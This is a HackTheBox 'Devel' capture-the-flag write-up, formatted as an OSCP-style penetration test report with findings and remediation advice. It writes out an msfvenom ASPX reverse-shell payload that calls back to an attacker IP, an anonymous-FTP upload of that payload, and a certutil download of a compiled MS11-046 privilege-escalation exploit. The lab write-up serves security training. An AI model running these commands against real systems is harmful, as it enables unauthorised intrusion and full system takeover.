# HTB Devel - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2025-12-17

---

## 0. Lesson Learned

Classic ASP (`.asp`) is enabled out of the box on **IIS 5 / 6**, and is optional but often not installed on **IIS 7+**. On newer IIS, `.aspx` is the safer bet.

---

## 1. Executive Summary

The target system *HTB Devel* was found to be vulnerable to multiple critical misconfigurations that allowed an unauthenticated attacker to gain full SYSTEM-level access. Anonymous FTP access combined with an exposed IIS web root enabled remote code execution. Local privilege escalation vulnerabilites present on the outdated Windows operating system allowed escalation from a low-privileged web context to NT AUTHORITY\SYSTEM.

Full compromise of the system was achieved.

---

## 2. Scope

- **Target:** 10.129.11.44
- **Environment:** HackTheBox Devel (Retired Machine)
- **Testing Window:** 2025-12-17
- **Objective:** Obtain user-level and root-level access

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Vulnerability Analysis
- Exploitation
- Privilege Escalation
- Post-Exploitation

---

## 4. Information Gathering

A full TCP port scan was conducted with Nmap:

```
nmap -p- -sCV 10.129.11.44 -T4 -oA devel_initial
```

Identifying two exposed services:

- 21/tcp - Microsoft FTP service with anonymous authentication enabled
- 80/tcp - Microsoft IIS 7.5 web server displaying the default IIS landing page

The FTP service allowed unauthenticated access and exposed files consistent with an IIS web root, indicating a direct relationship between FTP-accessible content and the web server.

---

## 5. Web Enumeration

Directory enumeration was performed with Gobuster:

```
gobuster dir -u http://10.129.11.44 -w /usr/share/wordlists/dirb/common.txt -x htm
```

Revealing the presence of the `aspnet_client` directory, confirming that ASP.NET was enabled on the IIS instance. No custom web application functionality was identified beyond default IIS content.

---

## 6. Exploitation

Using anonymous FTP access, files were uploaded directly into the IIS web root.

A reverse shell payload was generated using msfvenom in ASP.NET (`.aspx`):

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
```

And uploaded via FTP:

```
put shell.aspx
```

Upon requesting the uploaded ASPX file through the web server, a reverse shell was established as **iis apppool\web**. This confirmed successful remote code execution through the web server.

---

## 7. Post-Exploitation Enumeration

System enumeration with `systeminfo` and `whoami /priv` revealed:

- **OS:** Windows 7 Enterprise Build 7600
- **Architecture:** 32-bit
- **Privilege:** SeImpersonatePrivilege enabled

The presence of SeImpersonatePrivilege indicated that the system was likely vulnerable to known local privilege escalation exploits.

---

## 8. Privilege Escalation

Multiple privilege escalation techniques were evaluated. A 32-bit version of PrintSpoofer failed to escalation privileges.

A local privilege escalation exploit targeting **MS11-046** was compiled on the attacker machine:

```
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

And transferred to the target:

```
certutil -urlcache -split -f http://10.10.14.10/MS11-046.exe C:\Windows\Temp\MS11-046.exe
```

Execution of the exploit successfully elevated privileges to **NT AUTHORITY\SYSTEM**.

---

## 9. Proofs

**User Flag**: *REDACTED*

```
type C:\Users\babis\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## 10. Key Vulnerabilities Identified

| Vulnerability | Severity | Description | Impact |
|---------------|----------|-------------|--------|
| Anonymous FTP Login to Web Root Directory | Critical | Unauthenticated login to the web root directory allows upload of malicious files including reverse shell code executables | Remote Code Execution |
| MS11-046 Windows Kernel Exploit | High | The Ancillary Function Driver (`afd.sys`) improperly validates input from user mode to kernel causing elevation of privileges | Root Access |

---

## 11. Remediation Recommendations

- Disable anonymous FTP access immediately
- Separate FTP directories from the IIS web root
- Upgrade the operating system to a supported version
- Apply all missing security patches
- Restrict execution of server-side scripts where not required
- Monitor and log FTP and web server activity

---

## 12. Conclusion

The HTB Devel system was critically vulnerable due to insecure service configuration and an unpatched legacy operating system. The attack required no authentication and resulted in complete system takeover. Immediate remediation is strongly recommended.

---

## 13. Appendix

### Exploits

MSFvenom Web Payloads Cheatsheet:
[https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

MS11-046 Local Privilege Escalation:
[https://www.exploit-db.com/exploits/40564](https://www.exploit-db.com/exploits/40564)